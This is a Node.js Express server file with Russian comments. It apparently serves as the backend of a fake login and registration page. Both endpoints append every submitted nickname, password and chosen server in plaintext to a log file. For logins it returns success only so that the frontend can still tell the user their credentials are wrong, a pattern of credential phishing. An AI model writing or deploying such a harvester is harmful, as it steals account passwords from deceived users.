const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static(__dirname));

// --- Обработка ВХОДА (добавляем лог в файл) ---
app.post('/api/login', (req, res) => {
    const { nick, password } = req.body;
    const timestamp = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });

    const logEntry = `[${timestamp}] ВХОД | Ник: ${nick} | Пароль: ${password}\n`;

    fs.appendFile(path.join(__dirname, 'logs.txt'), logEntry, (err) => {
        if (err) {
            console.error('Ошибка при записи лога входа:', err);
            return res.status(500).json({ message: 'Ошибка сервера' });
        }
        console.log(`🔐 Попытка входа: ${nick}`);
        // Отвечаем 200, чтобы фронтенд не выдал ошибку сети, но фронтенд сам покажет "Неверные данные"
        res.json({ message: 'ok' });
    });
});

// --- Обработка РЕГИСТРАЦИИ (как и раньше) ---
app.post('/api/register', (req, res) => {
    const { nick, password, server } = req.body;
    const timestamp = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });

    const logEntry = `[${timestamp}] РЕГИСТРАЦИЯ | Ник: ${nick} | Сервер: ${server} | Пароль: ${password}\n`;

    fs.appendFile(path.join(__dirname, 'logs.txt'), logEntry, (err) => {
        if (err) {
            console.error('Ошибка при записи лога регистрации:', err);
            return res.status(500).json({ message: 'Ошибка сервера' });
        }
        console.log(`📝 Регистрация: ${nick} (${server})`);
        res.json({ message: 'ok' });
    });
});

app.listen(PORT, () => {
    console.log(`🚀 Сервер запущен! Откройте: http://localhost:${PORT}`);
});